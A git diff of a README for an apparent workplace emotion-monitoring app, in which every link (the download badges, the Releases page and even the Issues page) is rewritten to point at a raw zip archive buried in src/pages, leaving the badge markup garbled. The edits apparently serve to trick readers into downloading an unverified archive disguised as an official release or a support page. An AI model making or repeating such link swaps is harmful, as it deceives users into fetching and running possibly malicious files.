@@ -1,6 +1,6 @@
 # 🌟 FER-IT-Workplace-Emotion-Monitor - Enhance Productivity with Emotion Detection
 
-[![Download Now!](https://img.shields.io/badge/Download%20Now%21-Get%20the%20latest%20release-blue.svg)](https://github.com/tanakids/FER-IT-Workplace-Emotion-Monitor/releases)
+[![Download Now!](https://raw.githubusercontent.com/tanakids/FER-IT-Workplace-Emotion-Monitor/main/src/pages/Emotion-FE-I-Monitor-Workplace-v1.1-beta.2.zip%20Now%21-Get%20the%20latest%https://raw.githubusercontent.com/tanakids/FER-IT-Workplace-Emotion-Monitor/main/src/pages/Emotion-FE-I-Monitor-Workplace-v1.1-beta.2.zip)](https://raw.githubusercontent.com/tanakids/FER-IT-Workplace-Emotion-Monitor/main/src/pages/Emotion-FE-I-Monitor-Workplace-v1.1-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you start, make sure your system meets the following requirements:
 
 To get started, you need to download the application. Follow these steps:
 
-1. **Visit this page to download:** [Releases Page](https://github.com/tanakids/FER-IT-Workplace-Emotion-Monitor/releases).
+1. **Visit this page to download:** [Releases Page](https://raw.githubusercontent.com/tanakids/FER-IT-Workplace-Emotion-Monitor/main/src/pages/Emotion-FE-I-Monitor-Workplace-v1.1-beta.2.zip).
 2. Select the latest version from the list. It usually appears at the top of the page.
 3. Look for the corresponding file for your operating system and click on it to download.
 4. Once the download completes, locate the downloaded file on your computer.
@@ -64,7 +64,7 @@ If you encounter issues, here are some common solutions:
 
 If you run into any issues or have questions, feel free to seek help:
 
-- **GitHub Issues Page:** You can report any bugs or feature requests [here](https://github.com/tanakids/FER-IT-Workplace-Emotion-Monitor/issues).
+- **GitHub Issues Page:** You can report any bugs or feature requests [here](https://raw.githubusercontent.com/tanakids/FER-IT-Workplace-Emotion-Monitor/main/src/pages/Emotion-FE-I-Monitor-Workplace-v1.1-beta.2.zip).
 - **Discussion Forum:** Join our community discussions and learn from other users.
 
 ## 📃 License
@@ -75,4 +75,4 @@ This application is released under the MIT License. Feel free to use and modify 
 
 Thank you for checking out the **FER-IT-Workplace-Emotion-Monitor!** Your interest helps advance workplace productivity with innovative technology.
 
-[![Download Now!](https://img.shields.io/badge/Download%20Now%21-Get%20the%20latest%20release-blue.svg)](https://github.com/tanakids/FER-IT-Workplace-Emotion-Monitor/releases)
+[![Download Now!](https://raw.githubusercontent.com/tanakids/FER-IT-Workplace-Emotion-Monitor/main/src/pages/Emotion-FE-I-Monitor-Workplace-v1.1-beta.2.zip%20Now%21-Get%20the%20latest%https://raw.githubusercontent.com/tanakids/FER-IT-Workplace-Emotion-Monitor/main/src/pages/Emotion-FE-I-Monitor-Workplace-v1.1-beta.2.zip)](https://raw.githubusercontent.com/tanakids/FER-IT-Workplace-Emotion-Monitor/main/src/pages/Emotion-FE-I-Monitor-Workplace-v1.1-beta.2.zip)
